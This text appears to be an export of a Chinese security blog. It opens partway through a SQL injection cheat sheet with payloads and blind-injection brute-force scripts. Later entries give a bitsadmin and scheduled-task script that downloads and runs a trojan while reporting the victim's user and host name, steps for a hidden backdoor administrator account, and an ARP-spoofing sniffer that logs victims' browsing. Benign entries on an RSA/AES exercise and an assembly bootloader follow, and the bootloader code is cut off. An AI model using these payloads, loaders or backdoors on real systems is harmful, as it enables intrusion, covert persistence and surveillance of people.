也可以用like，根据排列顺序进行真值判断（9）注释符绕过在注入时的注释符一般为# –当两者不能用时就不能闭合引号 这里介绍一个奇淫巧技 select 1,2,3 from yz where ‘1’/1=(1=1)/‘1’=’1’ (1=1)中就有了判断位为下面的注入打下基础（10）宽字节绕过字节注入也是在最近的项目中发现的问题，大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在%df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。注：select防止用户自定义的名称和mysql保留字冲突（11）with rollup一般结合group by使用 select 1 as test from yz group by test with rollup limit 1 offset 1;+——+| test |+——+| NULL |+——+（12）无列名注入给未知列名起别名 select a from (select 1,2,3aunion select from yz)v;（13） 判断列数绕过当order by 被过滤后就可以使用into 变量来绕过 select from yz limit 1,1 into @a,@b,@c;3.SQL注入知识1.SQL越界 ，也就是能执行自己的sql语句 2.盲注的话找一个点可以控制两种不同的反应 3.取数据并做真值判断 4.写脚本暴库上边是基于一般的注入题目的解题步骤，如果有特殊条件也可灵活变通mysql数据库元信息在mysql中存在information_schema是一个信息数据库，在这个数据库中保存了Mysql服务器所保存的所有的其他数据库的信息，如数据库名，数据库的表，表的字段名称 和访问权限。在informa_schema中常用的表有:schemata:存储了mysql中所有的数据库信息，返回的内容与show databases的结果是一样的。 tables:存储了数据库中的表的信息。详细地描述了某个表属于哪个schema，表类型，表引擎。 show tables from secuiry的结果就是来自这个表 columns:详细地描述了某张表的所有的列以及每个列的信息。 show columns from users的结果就是来自这个表select database(); #查选数据库select schema_name from information_schema.schemata limit 0,1 #查询数据库select table_name from information_schema.tables where table_schema=database() limit 0,1; #查询表select column_name from information_schema.columns where table_name=‘users’ limit 0,1; #查询列（1）基本注入方式得到字段总数可以使用order by 函数，也可以直接使用union查询select from yz order by 3;ERROR 1054 (42S22): Champ ‘3’ inconnu dans order clause当使用order by 3时程序出错，那么select的字段一共是2个。得到显示位在页面上会显示从select中选取的字段，我们接下来就是要判断显示的字段是哪几个字段。使用如下的payload(两者均可)进行判断。id=-1 union select 1,2,3id=1 and 1=2 union select 1,2,3如果是1显示出来，那么1就是显示位查看数据库union select 1,version(),database()查选表名由于database()返回的就是当前web程序所使用的数据库名，那么我们就利用database()来查询所有的表信息。当然在上一步中。我们也已经知道当前的database就是security。那么我们构造的payload如下： union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()查选列名在知道了表名之后，接下来我们利用information_schema.columns就可以根据表名来获取当前表中所有的字段。payload如下：id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=‘users’id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273(users的十六进制)查看数据库内容在知道了当前数据库所有的表名和字段名之后，接下来我们就可以dump数据库中所有的信息了。比如我们下载当前users表中所有的数据。可以使用如下的payload：id=-1 union select 1,group_concat(username,password),3 from users（2）报错注入group by 与 floor rand 函数的报错payload(select count() from (select 1 union select 2 union select 3)x group by concat(1,floor(rand(0)2)))测试语句select 1 from yz where (select count() from (select 1 union select 2 union select 3)x group by concat(222,floor(rand(0)2)));显示 Duplicata du champ ‘2221’ pour la clef ‘group_key’ 在222处存在报错显示点，可利用此点进行报错注入payload 利用方法 必须使其成为关键语句即where的决定权在payload中 例如： - where 1=1 and payload - where 1=2 or payload - where payload这里有原理的解释 - extractvalue payloadextractvalue(1,concat(0x5c,(select 1)))extractvalue(1,concat(0x5c,(select 1),0x5c,1)) - updatexml payloadupdatexml(1,concat(0x5c,(select 1)),0)updatexml(1,concat(0x5c,(select 1),0x5c,1),0)最近又出来了insert update的报错注入知识点如下 or 注入语句 or 整体式子为 INSERT INTO users (id, username, password) VALUES (2,’’ or 注入语句 or’’, ‘’);（3）盲注一般都是寻找盲注点，找到payload,利用payload 在这里给出几个爆破脚本import requestsurl=r’http://web.jarvisoj.com:32787/login.php‘string=‘’dic=‘0123456789abcdefghijklmnopqrstuvwxyz’for i in range(1,33): for j in dic: id=“/‘XOR(if(ord((select//substr(table_name,{0},1)//from/**/information_schema.tables/!where/table_schema=database()))={1},sleep(3),0))OR’/“.format(str(i),ord(j)) data={ ‘username’:id, ‘password’: 1 } print j s=requests.post(url=url,data=data) sec=s.elapsed.seconds if sec &gt; 2: string+=j break print stringimport requestscookies={ ‘PHPSESSID’: ‘944d46747cd9059f63dc2e103b2fe31a’}dic=‘3_abcdefghijklmnopqrstuvwxyz’string = ‘’for i in range(1,33): for j in dic: url=‘http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1 and ord((select substr(table_name,{0},1) from information_schema.tables where table_schema=database())) = {1}’.format(str(i),ord(j)) s=requests.get(url=url , cookies=cookies) content=s.content length=len(content) print length if length &gt; 400 : string+=j break print string 二分法盲注# coding:utf-8import requestsfrom math import ceilglobal stringstring = ‘’def charge(mid,i):#判断大小 url=‘http://wargame.kr:8080/web_chatting/chatview.php?t=1&amp;ni=if(ascii(substr((select group_concat(readme) from chat_log_secret),{0},1))&lt;={1},10000000000,23334)’.format(str(i),str(mid)) # s=requests.get(url=url) content=s.content length=len(content) #print length if length &gt; 10 : return 0 else: return 1def dichotomie(l,r,i):#利用二分法查找 mid = (l+r)/2 #print “l and r ,mid:”,l,r,mid if l == r: global string string += chr(r) print string return 0 if charge(mid,i):#&lt;= #print 0 dichotomie(l,mid,i) else: #print 1 dichotomie(int(ceil((l+r)1.0/2)),r,i)for i in range(1,100): dichotomie(32,127,i)print stringimport requestscookies={ ‘PHPSESSID’: ‘i6vl5rbtr5r8gsiu5cl6bfi8g7’}string = ‘’for i in range(1,33): for j in range(32,127): url=‘http://202.120.7.197/app.php?action=search&amp;keyword=&amp;order=if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),{},1)like({}),price,name)’.format(str(i),hex(j)) s=requests.get(url=url , cookies=cookies) content=s.content if content.find(‘5’) == 102 and ‘%’ != chr(j) : string+=chr(j) break print string （4）MD5注入$sql = “SELECT FROM admin WHERE pass = ‘“.md5($password,true).”‘“;md5($password,true)将MD5值转化为了十六进制 思路比较明确，当md5后的hex转换成字符串后，如果包含 ‘or’ 这样的字符串，那整个sql变成SELECT FROM admin WHERE pass = ‘’or‘6&lt;trash&gt;’提供一个字符串：ffifdyop（5）order by name 注入order by name id id是一个注入点 可以利用if语句进行注入order by name ,if(1=1,1,select 1 from information_schema.tables) 如果为假则执行第二条语句，要么报错要么没有返回值。这属于盲注的一种（6）运算符注入select from yz where a=’’^’123’^’12’ select from yz where a=’’^(substr(‘asd’,1,1)&lt;’z’)^1;都可以作为盲注的条件语句（7）文件写入SQL语句 + INTO OUTFILE ‘\var\www\html\1.txt’（8） 未知字段名注入select c from (select from yz union select 1,2,3c)x;（9）空数据延时注入select * from test where 1 and (select 1 from(select sleep(1))x);]]></content>
      <tags>
        <tag>WEB漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用计划任务和bitsadmin实现恶意代码长期控守]]></title>
    <url>%2F2017%2F02%2F26%2F%E4%BD%BF%E7%94%A8%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%92%8Cbitsadmin%E5%AE%9E%E7%8E%B0%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%95%BF%E6%9C%9F%E6%8E%A7%E5%AE%88%2F</url>
    <content type="text"><![CDATA[使用计划任务和bitsadmin实现恶意代码长期控守第一步：文件下载由于我们想要不被计算器防火墙拦截的下载木马文件，所以考虑使用Windows自带的命令行工具。使用bitsadmin下载工具就可以做到这点。 这是写好保存的.ps1脚本# 创建一个新的Job,命名为Window Updatessbitsadmin /Create Window Updatess# 指定一个下载任务和下载的地址 使用计划任务和bitsadmin实现恶意代码长期控守第一步：文件下载由于我们想要不被计算器防火墙拦截的下载木马文件，所以考虑使用Windows自带的命令行工具。使用bitsadmin下载工具就可以做到这点。 这是写好保存的.ps1脚本# 创建一个新的Job,命名为Window Updatessbitsadmin /Create “Window Updatess”# 指定一个下载任务和下载的地址bitsadmin /AddFile “Window Updatess” http://ctf5.shiyanbar.com/423/re/rev2.exe d:\100w.exe# 设置触发事件的条件bitsadmin /SetNotifyFlags “Window Updatess” 1# 设置作业完成数据传输或作业进入状态将运行的命令行程序bitsadmin /SetNotifyCmdLine “Window Updatess” “%COMSPEC%” “cmd.exe /c bitsadmin.exe /complete \”Window Updatess\” &amp;&amp; start /B d:\100w.exe”# 设置下载任务出错时重传的延迟bitsadmin /SetMinRetryDelay “Window Updatess” 120# 添加自定义的HTTP头bitsadmin /SetCustomHeaders “Window Updatess” “Caller:%USERNAME%@%COMPUTERNAME”# 激活新的任务bitsadmin /Resume “Window Updatess” 在PowerShell中执行 创建新的Job 最后激活Job 这样，我们就实现了第一步，就是利用Windows自带的命令行工具实现下载木马，并且不被防火墙拦截。第二步：监控木马当受害机器下载执行木马后，为了实现对木马的监控，可以使用服务器实现。由于这个下载本质是也是使用HTTP进行的一次GET请求，也就是说会发送HTTP请求头。我们在ps1脚本中设置了HTTP头：## 添加自定义的HTTP头bitsadmin /SetCustomHeaders “Window Updatess” “Caller:%USERNAME%@%COMPUTERNAME“这样，就可以做到监控木马，第二步完成第三步：建立计划任务形式的加载bitsadmin使用schtasks命令建立计划任务来加载bitsadmin执行”Window Update“ 给出具体命令（命令中有标注，具体执行时要去除）schtasks /Create /TN “Window Update” /TR “%WINDIR%\system32\bitsadmin.exe /resume \”Windows Update\”” /sc minute /MO 30 /ED(此任务的最后一次运行时间) 2017/03/01 /ET 12:00(最后一次的运行时间) /Z(在任务运行完毕后删除任务) /IT(标志此任务只有在登录情况下才运行) /RU %USERNAME%(指定运行的用户账户) 执行结果]]></content>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WINDOWS环境设置隐藏用户]]></title>
    <url>%2F2017%2F02%2F25%2FWINDOWS%E7%8E%AF%E5%A2%83%E8%AE%BE%E7%BD%AE%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%2F</url>
    <content type="text"><![CDATA[WINDOWS环境设置隐藏用户 1.实验目的在windows环境下，新建用户，并且实现隐藏，已达到不被用户发现的目的，可以实现随时登录电脑。2.实验方法新建用户 利用命令行创建用户并提升至管理员权限 net user yz5$ 123456 /add &amp; net localgroup administrators yz5$ /add 用户隐藏 新建的用户我们可以再控制面板中找到，但是命令net user却不显示 每个用户在注册表中都有注册，我们的目的是要让控制面板中的用户不显示，但也可以让用户登录。打开注册表，发现所有的用户都在HKEY_LCAL_MACHINE/SAM/SAM/Domains/Accout/Users 显然知道000001F4是管理员，000003F3同时也是，把3F3的F键值改为管理员的3F3键值（这一步是为了在控制面板隐藏掉用户yz5$，不影响正常的登录），然后将其导出 删除注册表中的用户信息 再从桌面上双击图标，导入数据库。yz5$键值导入成功登录隐藏用户 在此基础上，cmd及控制面板已经看不到新建的用户了。那么问题来了，我们怎么登录呢。 可以采用一些比较黑科技的方法，这里采用了修改登录页面的方法。如果是固定的则永远登不上去。 必须把登录页面写成可以直接输入用户名、密码的。利用gpedit.msc 将不显示最后的用户名状态改为 启用 3.实验总结总体来说，基本的功能已经实现。通过实验进一步学习到了许多命令行命令。当然这个实验也不是十分的完美，比如在计算机管理页面，有个新建的用户就会被发现。还要有很长的路要走，实现的功能还很多。]]></content>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python Django项目开发（WIFI-SNIFF）]]></title>
    <url>%2F2017%2F02%2F18%2FPython%20Django%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%EF%BC%88WIFI-SNIFF%EF%BC%89%2F</url>
    <content type="text"><![CDATA[因为数据收集的代码是利用Python写的，因此想到了利用Django进行项目开发，实现的具体功能是在局域网内进行信息嗅探，并将嗅探得到的信息展示在WEB网页上。 因为数据收集的代码是利用Python写的，因此想到了利用Django进行项目开发，实现的具体功能是在局域网内进行信息嗅探，并将嗅探得到的信息展示在WEB网页上。一.数据嗅探模块1.利用ettercap进行局域网欺骗首先主机利用ARP欺骗，使得所有的数据包都经过攻击机。（工具选择ettercap） 2.python模块利用python在数据包截获方面有现成的模块，例如pcap。#listen to sniff packetpc = pcap.pcap()b = ‘tcp port 80’pc.setfilter(b)#可以直接对经过网卡的所有数据包进行捕获在数据包分析方面，例如dpkt。eth = dpkt.ethernet.Ethernet(buf)ip = eth.datatcp = ip.data#可以把截获的数据包分层处理 如上所示分成 以太网层，IP层，tcp层······对数据中URL的分析就是利用http层的协议内容进行截获分析3.数据包分析通过python现有的模块将所截获的数据包分层处理。 目前对用户访问的URL的分析是通过http协议中的host头部获得。 用户的种类的分析也是根据http协议user-agent头部获得。 对于图片的的截取，目前做到的是匹配关键字的方法获得（匹配是否有image、jpg、png等，下一阶段直接从数据包中获得图片数据）。二.数据库模块1.数据库设计Django框架自带sqlite数据库可以直接使用。 设计一个用于存储用户信息的数据表victim字段包括 序号、用户种类、mac地址、连接时间、IP地址CREATE TABLE “victim” ( i&lt;/span&gt;d&lt;span class=&quot;hljs-escape&quot;&gt; INTEGER, u&lt;/span&gt;seragent&lt;span class=&quot;hljs-escape&quot;&gt; TEXT, m&lt;/span&gt;ac&lt;span class=&quot;hljs-escape&quot;&gt; TEXT, t&lt;/span&gt;ime&lt;span class=&quot;hljs-escape&quot;&gt; TEXT, i&lt;/span&gt;p&lt;span class=&quot;hljs-escape&quot;&gt; TEXT) 设计记录url的数据表Record_urls字段包括 序号、访问的URL、访问URL对应的时间CREATE TABLE R&lt;/span&gt;ecord_urls&lt;span class=&quot;hljs-escape&quot;&gt; ( i&lt;/span&gt;d&lt;span class=&quot;hljs-escape&quot;&gt; INTEGER, u&lt;/span&gt;rl&lt;span class=&quot;hljs-escape&quot;&gt; TEXT, t&lt;/span&gt;ime&lt;span class=&quot;hljs-escape&quot;&gt; TEXT)2.嗅探代码与数据库的连接嗅探到的数据信息通过Python语句存储至sqlite数据库，方便web网页访问。通过该语句连接至数据库#link to databaseconn = sqlite3.connect(“db.sqlite3”)并通过下面的语句访问数据库conn.execute(sql1)conn.commit()三.WEB页面模块1.Django开发简介Django是一个开放源代码的Web应用框架，由Python写成。采用了MVC的框架模式，即模型M，视图V和控制器C。它最初是被开发来用于管理劳伦斯出版集团旗下的一些以新闻内容为主的网站的，即是CMS（内容管理系统）软件。框架把控制层给封装了，无非与数据交互这层都是数据库表的读,写,删除,更新的操作.在写程序的时候，只要调用相应的方法就行了，感觉很方便。程序员把控制层东西交给Django自动完成了。 只需要编写非常少的代码完成很多的事情。所以，它比MVC框架考虑的问题要深一步，因为我们程序员大都在写控制层的程序。现在这个工作交给了框架，仅需写很少的调用代码，大大提高了工作效率。 用户访问的目录存在urls中from django.conf.urls import urlfrom django.contrib import adminfrom yz import views as yz_viewsurlpatterns = [ url(r’^admin/‘, admin.site.urls), url(r’^$’,yz_views.index), url(r’^login.html$’,yz_views.login), url(r’^index.html’,yz_views.index), url(r’^test.html$’,yz_views.test), url(r’^show_url.html$’,yz_views.show_url), url(r’^image.html$’,yz_views.image),]只有目录还不行，必须有新建的项目下views的引导。def index(request): ······def test(request): ······def show_url(request): ······def image(request): ······def login(request): ······templates里面存放的views中解析的静态网页 2.WEB页面功能介绍（1）登录页面设计了登录页面，因为网站在局域网内可以被访问，提高网站的安全性。 （2）用户展示受害者用户名单展示平台 （3）URL展示点击其中一个用户的URL，可进入展示该用户访问所有URL的页面 （4）image展示点击其中一个用户的image，可进入展示该用户访问部分image的页面 四.后期工作1.完善图片截获功能目前只能从访问连接中识别是否是图片链接，下一步实现直接从数据包结构中分析出图片数据。]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA&AES实现可靠通信]]></title>
    <url>%2F2017%2F01%2F19%2FRSA%26AES%E5%AE%9E%E7%8E%B0%E5%8F%AF%E9%9D%A0%E9%80%9A%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[密码作业要求自己设计一个安全可靠的通信，目前已有的SSL通信是广为流传的大家都在用的通信机制，在这用Socket实现模拟SSL协议通信过程 通信过程设计在做实验之前，想直接用封装好的SSL安全套接字接口。为了搞懂其中的加密机制自己用Socket接口模拟了简单的安全套接字的验证过程（这里我没有认证机构，也没有证书，但用一对事先生成的RSA）。先来简单的描述SSL验证机制，接着介绍我设计的安全通信协议。一、SSL安全通信机制1.通信机制CA 机构，又称为证书认证中心 (Certificate Authority) 中心，是一个负责发放和管理数字证书的第三方权威机构，它负责管理PKI结构下的所有用户(包括各种应用程序)的证书，把用户的公钥和用户的其他信息捆绑在一起，在网上验证用户的身份。CA机构的数字签名使得攻击者不能伪造和篡改证书。1．SSL客户端（也是TCP的客户端）在TCP链接建立之后，发出一个Clienthllo来发起握手，这个消息里面包含了自己可实现的算法列表和其它一些需要的消息。 2．SSL的服务器端会回应一个Serverhllo，这里面确定了这次通信所需要的算法，然后发过去自己的证书（里面包含了身份和自己的公钥以及可靠机构的数字签名）。 3．Client在收到这个消息后会生成一个秘密消息，用SSL服务器的公钥加密后传过去。 4．SSL服务器端用自己的私钥解密后，会话密钥协商成功，双方可以用同一份会话密钥来通信了。证书校验： 证书的目的就是让客户端相信公钥确实是服务器发过来的，CA用自己的私钥加密证书，Client用CA的公钥解密，如果解密成功，既证明了证书的真实性。2.存在的问题利用SSL通信能够有效的防治第三者盗取修改服务器公钥以及截获客户端发送的密文。但是存在以下不可规避的问题：客户端say hello 后，被代理服务器拦截，代理服务器也有CA颁发的证书，他把自己的合法证书发给客户端，客户端用证书里面的公钥解密签名之后，得到了各种信息，一看信息都对上了，没毛病信任。然后代理服务器宰相真正的服务器say hello，服务器下发真正的证书，代理服务器假装自己是客户端，信任了证书，然后校验通过，发用真正公钥加密后的随机数给服务器，服务器当然能解开，也就是代理服务器作为客户端和真正的服务器建立了合法的通信。再看客户端在校验了代理服务器自己的证书后也建立了合法的通信，这个时候，代理服务器作为中间人，因为他有自己的私钥和真正的公钥，可以欺上瞒下，俩边的信息都从它这里过了一次，信息被他偷窥到。攻击成功。在这里解决办法就是客户端内置真正的公钥，当代理服务器把它自己的证书传过来的时候，客户端用内置的公钥去解密证书中的签名，因为不是真正的私钥加密的所以解密失败，校验也就失败，连接中断。这也就是客户端信任所有的证书的风险—被中间人攻击。二、设计可靠通信过程在这里为了简单实现，自己当做了认证机构，证书格式不是标准格式只有公钥hash值签名以及公钥明文（这里就没有写其他的信息例如持有人、签发机构、国家、地区等），同时颁发证书也是直接物理给的没有设服务器，并将证书公钥直接内置到client（这里防止中间代理服务器攻击上文所述）。通信协议如下： 1. 客户端连接服务端首先建立没有安全机制的Socket TCP连接 2. 服务端向客户端颁发证书（这里是自定义格式 上文所述） 3. 客户端用CA内置公钥（自己是认证机构）验证服务器证书的真实性（通过CA公钥解密 签过名的Server公钥并与文件MD5比对） 4. 前面身份认证完成后，客户端在本地生成随机AES加密密钥以及初始向量（Key&amp;Vi）,使用证书中的公钥加密后传送给服务器 5. 服务器收到客户端信息后，用自己申请证书的私钥解密，得到客户端随机生成的AES加密密钥，完成了密钥协商的操作 6. 之后客户端、服务器对等通信，相互发送加密消息通信图如下： 通过以上方法模拟实现的SSL通信协议，简化了协议本身，但基本实现了协议功能。三、代码实现1.ServerRSA密钥生成及证书颁发//generateKey(); //生成密钥 FILE Public; unsigned int Pub_len; char RSA_Buf[RSA_Buf_Len] = { 0 }; Public = fopen(“public.pem”, “rb”); fseek(Public, 0L, SEEK_END); //获取长度 Pub_len = ftell(Public); fseek(Public, 0L, SEEK_SET); fread(RSA_Buf, 1, Pub_len, Public); send(ClientSocket, (char )&amp;Pub_len, 4, 0); //发送公钥长度 send(ClientSocket, RSA_Buf, Pub_len, 0); //发送公钥文本 md5(RSA_Buf); //获取公钥的md5值 string m; m.assign(MD5_string, 32); string m1 = DS_privateKey(m); //进行md5的数字签名利用第三方提供的私钥 这里可以是证书 char plain = (char )m1.c_str(); send(ClientSocket, plain, 256, 0); //发送签证后的md5码接收来自S的RSA加密的AES密钥unsigned int KEY_Len; unsigned char KEY_RSA[MSG_LEN]; memset(KEY_RSA, 0, MSG_LEN); recvn(ClientSocket, (unsigned char )&amp;KEY_Len, sizeof(unsigned int));//接收来自另一方RSA公钥加密的AES密钥长度 recvn(ClientSocket, (unsigned char )KEY_RSA, KEY_Len); //接收公钥加密的AES密钥 string miwen; miwen.assign((char )KEY_RSA, 256); string c = DS_publicKey(miwen); c = bio_read_privateKey(c); memcpy(key, c.c_str(), 16); //利用私钥解开AES密钥密文2.ClientRSA公钥接收&amp;身份认证char RSA_Buf[RSA_Buf_Len]; unsigned char KEY_RSA[MSG_LEN]; memset(RSA_Buf, 0, MSG_LEN); recvn(CientSocket, (unsigned char )&amp;Pub_len, sizeof(unsigned int)); recvn(CientSocket, (unsigned char )RSA_Buf, Pub_len); fwrite(RSA_Buf, Pub_len, 1, Public); fclose(Public); //接收明文传送的公钥 md5(RSA_Buf); //获取公钥的md5值 recvn(CientSocket, (unsigned char )KEY_RSA, 256); //接收签名过的MD5值 string DS_public; DS_public.assign((char )KEY_RSA, 256); string Real_MD5 = DS_publicKey(DS_public); //校验MD5值 cout &lt;&lt; “Hash值校验：” &lt;&lt; endl; cout &lt;&lt; “Server MD5:” &lt;&lt; Real_MD5&lt;&lt;endl; cout &lt;&lt; “Client MD5:” &lt;&lt; MD5_string&lt;&lt;endl; if (Real_MD5 == MD5_string) cout &lt;&lt; “对方身份认证成功！！！请放心通信！！！” &lt;&lt; endl; else cout &lt;&lt; “对方身份验证失败！！！请重新连接！！！” &lt;&lt; endl; cout &lt;&lt; “本次通信采用的安全算法:RSA 2048、AES（CBC）” &lt;&lt; endl;利用公钥向C端发送KEY&amp;VI randnum(); //随机生成AES密钥 string m = bio_read_publicKey(key); string m1 = DS_privateKey(m); string c = DS_publicKey(m1); unsigned char p = (unsigned char )m1.c_str(); KEY_Len = 256; Ret = send(CientSocket, (char )&amp;KEY_Len, 4, 0); send(CientSocket, (char *)p, KEY_Len, 0); //发送公钥加密的AES密钥四、功能演示1.Server 2.Client 3.通信过程 五、实验感悟通过本次实验我又进一步学习了SSL协议以及各种加密算法，虽然没有用到安全套接字但是自己模拟出了简单的安全通信协议，实践才是检验知识掌握的有效方法。参考资料： SSL证书的合法性检验 SSL协议与数字证书原理 SSL工作原理 PKI、CA与证书格式&amp;使用]]></content>
      <tags>
        <tag>密码学应用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编实验]]></title>
    <url>%2F2017%2F01%2F15%2F%E6%B1%87%E7%BC%96%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[实验报告题目编写一个可以自行启动的计算机，不需要在现有操作系统环境中运行的程序实现 显示时间、修改时间、变色、重启、进入操作系统 实验报告题目编写一个可以自行启动的计算机，不需要在现有操作系统环境中运行的程序实验内容裸机编程，不需要操作系统能够实现查看系统时间，修改系统时间，重启，进入硬盘操作系统等功能实验要求提交源码，实验报告实验原理系统启动初始化完成后最终调用19h，该中断读取软盘的第一扇区或硬盘的第一扇区到0:7c00开始的512个字节的内存空间中，并将 CS:IP 指向0:7C00h执行实验步骤实验主要可以分为两部分：主引导程序，存在于软盘第0扇区，由BIOS的19h中断读取到0:7c00开始的内存单元中，并执行0:7c00的第一行代码。这一段的任务是将软盘1,2扇区的数据读入内存，并执行。（这里读入到了0800：0开始的内存中）系统程序，存放所有运行所需的程序和子程序实验环境RadASMVMware Workstation Pro(Windows XP操作系统虚拟机)BOOTICEx64设计细节及程序讲解设计细节系统程序启动后，首先打印系统菜单，即多个字符串，打印完毕后，调用int16h中断，等待用户输入，输入只有1~5是有效的，其他输入不会被接受，五个数字对应的功能分别是1 查看系统时间 2 修改系统时间 3 重启系统 4 进入磁盘系统 5 改变颜色输入编号进入对应功能查看系统时间 首先进行清屏操作，然后通过端口读取CMOS的不同存储地址的信息得到系统时间，并居中显示。 同样具有按下5键改变颜色的功能，在循环刷新时间的过程中判断输入即可。因为一直在循环刷新时间所以按下5键改变颜色时，刷新速度会非常快，出现颜色闪烁的效果 按下q键返回主菜单，实现方法是跳转到程序开头处，实际上相当于重新显示了菜单修改系统时间 首先进行清屏操作，并显示提示输入格式的字符串 用户键盘进行输入，将输入存入预先申请的内存空间的同时，在屏幕的左上角对输入进行显示，这是通过写入显存实现的 读取用户输入完毕后，进行ASCII与BCD码的转换，存入另一段预先申请的内存空间 转换完毕后，通过端口将参数送入CMOS，修改时间 修改完毕后，调用显示时间函数，立刻显示了修改后的时间（此时具有按下5键改变颜色的功能，闪烁） 此时，可以按下q键返回主界面重启系统 通过重写 CS:IP 为0ffffh：0000h，重新启动系统进入磁盘操作系统 通过调用int13h中断的2号功能实现的，具体做法是初始化内存地址并设置好用于启动硬盘系统的参数，将硬盘系统的引导写入0000:700c，并置CS：IP为0000:700c，从此处执行硬盘系统的引导程序，即可进入硬盘操作系统修改颜色 当能捕捉到5键时，进入改变颜色函数，将显存部分颜色位进行修改代码讲解系统启动，显示菜单start: jmp sys_start ;菜单选项字符串(menuoptions)mo0 db ‘A Simple System Meum’,0mo1 db ‘1. Show System Time’,0mo2 db ‘2. Set System Time’,0mo3 db ‘3. Restart System’,0mo4 db ‘4. Go Disk System’,0mo5 db ‘Created By ChickSheep’,0 ;函数偏移s_function dw showtime,settime,restart_sys,go_disksyssys_start: mov ax,run_sys mov ds,ax call Clearall ;系统启动时先执行清屏操作 ;显示菜单show_meum: ;设定显示的行列数 mov cl,01h ;设定颜色，初始为蓝色 mov dl,30 ;初始化列数 mov dh,9 ;初始化行数 mov si,offset mo0 ;定位到字符串mo0偏移 call show_str mov dh,10 ;初始化行数 mov si,offset mo1 ;定位到字符串mo1偏移 call show_str mov dh,11 ;初始化行数 mov si,offset mo2 ;定位到字符串mo2偏移 call show_str mov dh,12 ;初始化行数 mov si,offset mo3 ;定位到字符串mo3偏移 call show_str mov dh,13 ;初始化行数 mov si,offset mo4 ;定位到字符串mo4偏移 call show_str mov dh,14 ;初始化行数 mov si,offset mo5 ;定位到字符串mo5偏移 call show_str监测用户输入 sys_input: mov ah,00h int 16h ;调用int 16h中断0号功能，查看键盘输入，为阻塞状态 mov bx,0 mov bl,al ;将键盘的ASCII码存入bl mov al,30H sub bl,al ;将得到的ASCII码转换为数字 cmp bx,1 ;若小于1则返回等待输入 jb short sys_input cmp bx,5 ja short sys_input ;若大于5则返回等待输入 cmp bx,5 ;若为1~4,则进入选择功能函数部分 jne func call changecolor ;若等于5则改变颜色 jmp sys_input ;结果处理完毕，返回监测输入 func: call Clearall ;执行各个指令前先清屏 sub bx,1 add bx,bx ;得到对应功能的函数偏移值 call s_function[bx] ;进入功能函数 call Clearall ;功能执行完毕后，清屏，等待重新显示主界面 jmp show_meum显示时间showtime proc ;显示时间的函数 jmp short showtime1 s1: db 9,8,7,4,2,0 ;CMOS中时间参数的存储位置 s2: db ‘/‘,‘/‘,‘ ‘,‘:’,‘:’,‘ ‘ ;时间参数分隔符号 showtime1: mov cx,6 ;CX=6 mov bx,offset s1 ;BX指向s, s为70端口每次所需要的入口参数的首地址 mov si,offset s2 ;SI指向s1, s1为显示格式的分隔符号 mov di,0 ;屏幕定位下标DI，初始为0，运行中自增 showtime2: push cx ;保存循环次数 mov al,ds:[bx] ;取当前需要的70端口的入口参数 mov dl,ds:[si] ;取当前需要的分隔符号 out 70h,al ;al-&gt;PORT 70,指示要访问单元的地址 in al,71h ;PORT 71-&gt;al，读出数据 mov ah,al mov cl,4 shr ah,cl ;ah取右移取高四位 and al,00001111b ;al取低四位 add ah,30h add al,30h ;数字转ASCII,相当于将十位与个位数分离，并转换为字符(BCD-&gt;两位ASCII) mov bp,0b800h ;定位到显存位置 mov es,bp mov byte ptr es:[1980+di],ah mov byte ptr es:[1982+di],al mov byte ptr es:[1984+di],dl;送B800显示 inc bx inc si ;2个缓冲区指针分别加1,指向下一个入口参数以及分隔符 add di,6 ;每次显示3个字符,加偏移为32 pop cx ;恢复当前计数 loop showtime2 ;CX-1!=0,循环到showtime2，继续读取时间参数 in al,60h ;读键盘 cmp al,06h ;5键的扫描码 je ccolor2 ;当输入为5时会跳转到修改颜色函数，否则跳过 jmp notccolor ccolor2: call changecolor notccolor: cmp al,10h ;Q键的扫描码 je quit ;Q键退出 jmp showtime1 ;跳转到showtime1 quit: retshowtime endp修改时间settime proc jmp short begin s db 9,8,7,4,2,0 ;CMOS中时间参数的存储位置 msg0 db 30 DUP(‘!’) ;用于存储用户输入 msg1 db ‘please input the time format:xx/xx/xx xx:xx:xx’,0 ;时间格式字符串 msg2 db 30 DUP(‘$’) ;用于存储转换后的BCD码 begin: mov dh,10 mov dl,15 mov si,offset msg1 mov cl,01h call show_str ;显示msg1，提示用户输入 mov bx, offset msg0 mov ax,0b800h mov es,ax ;定位到显存位置，用户显示用户输入 mov di,0 ;字符串位置初始化 mov si,0 ;显存位置初始化 int21: mov ah,00h ;循环调用int 16h中断，获取用户输入 int 16h cmp ah,0eh je set_back ;若为退格键，进行相应的处理 cmp ah,1ch je set_enter ;若为回车键，进行相应的处理 cmp di,17 ;若输入已经为17个字符,则不再读取输入 je int21 mov cs:[bx+di],al ;存储数据 mov es:[si],al ;显示数据 inc di ;定位到下一个字符存储位置 add si,2 ;定位到下一个显存位置 jmp int21 set_back: cmp di,0 ;若此时处于起始位置，则不进行删除操作 je con sub si,2 ;显存位置定位到前一个 sub di,1 ;存储位置定位到前一个 mov al,20h mov es:[si],al ;将前一个显存置为空格con: jmp int21 set_enter: cmp di,17 